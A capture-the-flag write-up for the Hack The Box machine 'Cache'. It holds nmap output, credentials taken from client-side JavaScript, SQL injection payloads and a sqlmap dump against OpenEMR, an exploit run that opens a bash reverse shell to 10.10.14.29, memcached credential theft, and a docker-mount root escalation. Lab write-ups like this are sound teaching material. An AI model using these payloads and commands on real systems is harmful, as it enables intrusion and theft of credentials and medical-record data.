Nmap Scan results:

root@LAPTOP-U5913CMD:/home/akshay# nmap -A -T4 10.10.10.188
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 12:02 IST
Nmap scan report for 10.10.10.188
Host is up (0.19s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Cache
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=34613%PV=Y%DS=2%DC=T%G=Y%TM=5F869B
OS:91%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)


Update the /etc/hosts file

 This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:
# [network]
# generateHosts = false
127.0.0.1       localhost
127.0.1.1       LAPTOP-U5913CMD.localdomain     LAPTOP-U5913CMD

127.0.0.1       localhost
::1     localhost
192.168.0.108   host.docker.internal
192.168.0.108   gateway.docker.internal
127.0.0.1       kubernetes.docker.internal
10.10.10.188    cache.htb
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters



$(function(){
    
    var error_correctPassword = false;
    var error_username = false;
    
    function checkCorrectPassword(){
        var Password = $("#password").val();
        if(Password != 'H@v3_fun'){
            alert("Password didn't Match");
            error_correctPassword = true;
        }
    }
    function checkCorrectUsername(){
        var Username = $("#username").val();
        if(Username != "ash"){
            alert("Username didn't Match");
            error_username = true;
        }
    }
    $("#loginform").submit(function(event) {
        /* Act on the event */
        error_correctPassword = false;
         checkCorrectPassword();
         error_username = false;
         checkCorrectUsername();


        if(error_correctPassword == false && error_username ==false){
            return true;
        }
        else{
            return false;
        }
    });
    
});


Username:ash
Password:H@v3_fun

Lol that was easy xD.


We can see they are working on hotel management system and the login was just a rabbithole.

lets update the /etc/hosts file to hms.htb

http://hms.htb/interface/login/login.php?site=default


A few days back i was doing a penetration testing on OpenEMR application. OpenEMR is a medical practice management software which also supports Electronic Medical Records (EMR). It is ONC Complete Ambulatory EHR certified and it features fully integrated electronic medical records, practice management for a medical practice, scheduling, and electronic billing. I was able to get code execution from an authenticated Arbitrary File Actions vulnerability. The remote code execution that exists was really unstable since it replaces the GLOBAL config. So i decided to make my own public exploit which I’ll post in my GitHub account

For the exploit to work you must have the correct credential and this can be done by performing a SQL Injection on that particular version of the application. SQL Injection in add_edit_event_user.php is caused by unsanitized user input from the ​eid​, userid​, and ​pid​ parameters. Exploiting this vulnerability requires authentication to Patient Portal; however, it can be exploited without authentication when combined with the Patient Portal authentication bypass .


THis website is vulnerable to sql injection.

The patient portal is vulnerable.

http://localhost/portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))

http://hms.htb/portal/add_edit_event_user.php?eid=1%20AND%20EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))

Query Error

ERROR: query failed: SELECT pc_facility, pc_multiple, pc_aid, facility.name FROM openemr_postcalendar_events LEFT JOIN facility ON (openemr_postcalendar_events.pc_facility = facility.id) WHERE pc_eid = 1 AND EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))

Error: XPATH syntax error: '\5.7.30-0ubuntu0.18.04.1'

/var/www/hms.htb/public_html/portal/add_edit_event_user.php at 121:sqlQuery

SO the website is vulnerable.



C:\Users\Voker\Downloads\sqlmapproject-sqlmap-1.4.10-6-g0585a55\sqlmapproject-sqlmap-0585a55>python3 sqlmap.py -r req.txt --batch --dbs -D openemr -T users_secure --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.10.5#dev}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:11:51 /2020-10-14/

[16:11:51] [INFO] parsing HTTP request from 'req.txt'
[16:11:52] [INFO] resuming back-end DBMS 'mysql'
[16:11:52] [INFO] testing connection to the target URL
[16:11:52] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: eid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: eid=(SELECT (CASE WHEN (5962=5962) THEN 1 ELSE (SELECT 5696 UNION SELECT 8201) END))

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x7176787071,(SELECT (ELT(7919=7919,1))),0x7162707071),7919)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: eid=1 AND (SELECT 8697 FROM (SELECT(SLEEP(5)))moRp)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7176787071,0x4f7a59716b79705741427757476c6f6651647363487159596f7866765073705352775847475a7655,0x7162707071),NULL-- -
---
[16:11:52] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[16:11:52] [INFO] fetching database names
[16:11:52] [INFO] resumed: 'information_schema'
[16:11:52] [INFO] resumed: 'openemr'
available databases [2]:
[*] information_schema
[*] openemr

[16:11:52] [INFO] fetching columns for table 'users_secure' in database 'openemr'
[16:11:52] [INFO] resumed: 'id','bigint(20)'
[16:11:52] [INFO] resumed: 'username','varchar(255)'
[16:11:52] [INFO] resumed: 'password','varchar(255)'
[16:11:52] [INFO] resumed: 'salt','varchar(255)'
[16:11:52] [INFO] resumed: 'last_update','timestamp'
[16:11:52] [INFO] resumed: 'password_history1','varchar(255)'
[16:11:52] [INFO] resumed: 'salt_history1','varchar(255)'
[16:11:52] [INFO] resumed: 'password_history2','varchar(255)'
[16:11:52] [INFO] resumed: 'salt_history2','varchar(255)'
[16:11:52] [INFO] fetching entries for table 'users_secure' in database 'openemr'
Database: openemr
Table: users_secure
[1 entry]
+----+--------------------------------+--------------------------------------------------------------+---------------+---------------------+---------------+---------------+-------------------+-------------------+
| id | salt                           | password                                                     | username      | last_update         | salt_history1 | salt_history2 | password_history1 | password_history2 |
+----+--------------------------------+--------------------------------------------------------------+---------------+---------------------+---------------+---------------+-------------------+-------------------+
| 1  | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | openemr_admin | 2019-11-21 06:38:40 | NULL          | NULL          | NULL              | NULL              |
+----+--------------------------------+--------------------------------------------------------------+---------------+---------------------+---------------+---------------+-------------------+-------------------+

[16:11:53] [INFO] table 'openemr.users_secure' dumped to CSV file 'C:\Users\Voker\AppData\Local\sqlmap\output\hms.htb\dump\openemr\users_secure.csv'
[16:11:53] [INFO] fetched data logged to text files under 'C:\Users\Voker\AppData\Local\sqlmap\output\hms.htb'


So we got the credentials now we can perform authenticated remote code execution on this website/server.

Here's a link to that exploit.
https://www.exploit-db.com/exploits/45161

- python openemr_rce.py http://hms.htb/ -u openemr_admin -p xxxxxx -c 'bash -i >& /dev/tcp/10.10.14.29/1234 0>&1'

root@LAPTOP-U5913CMD:/home/akshay/Desktop/HTBCache# mv 45161.py openemr_rce.py
root@LAPTOP-U5913CMD:/home/akshay/Desktop/HTBCache# python openemr_rce.py http://hms.htb/ -u openemr_admin -p xxxxxx -c 'bash -i >& /dev/tcp/10.10.14.29/1234 0>&1'
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
                                                       
   ={   P R O J E C T    I N S E C U R I T Y   }=    
                                                       
         Twitter : @Insecurity                       
         Site    : insecurity.sh                     

[$] Authenticating with openemr_admin:xxxxxx
[$] Injecting payload



root@LAPTOP-U5913CMD:/home/akshay# nc -nvlp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.10.188 41178
bash: cannot set terminal process group (1677): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cache:/var/www/hms.htb/public_html/interface/main$ idi
d
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@cache:/var/www/hms.htb/public_html/interface/main$ 

python3 -c "import pty;pty.spawn('/bin/bash')"

luffy@cache:~$ su ash
Password: H@v3_fun

ash@cache:/home/luffy$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash)
ash@cache:/home/luffy$ 

telnet 127.0.0.1 11211

get eusr
VALUE user 0 5
luffy
END
get passwd
VALUE passwd 0 9
0n3_#####
END

luffy@cache:/var/www/hms.htb/public_html/interface/main$ id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
luffy@cache:/var/www/hms.htb/public_html/interface/main$ 

I searched a lot for something to escalate the privileges but found nothing.

So I searched for a potential write up and found that docker can be used.

docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh

Lets see if we can get anything


luffy@cache:/var/www/hms.htb/public_html/interface/main$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
<docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh     
# id
uid=0(root) gid=0(root) groups=0(root)
# 

Woah its working nice.

This is a great machine to learn.

Thank you... Happy Hacking :)
-Voker2311
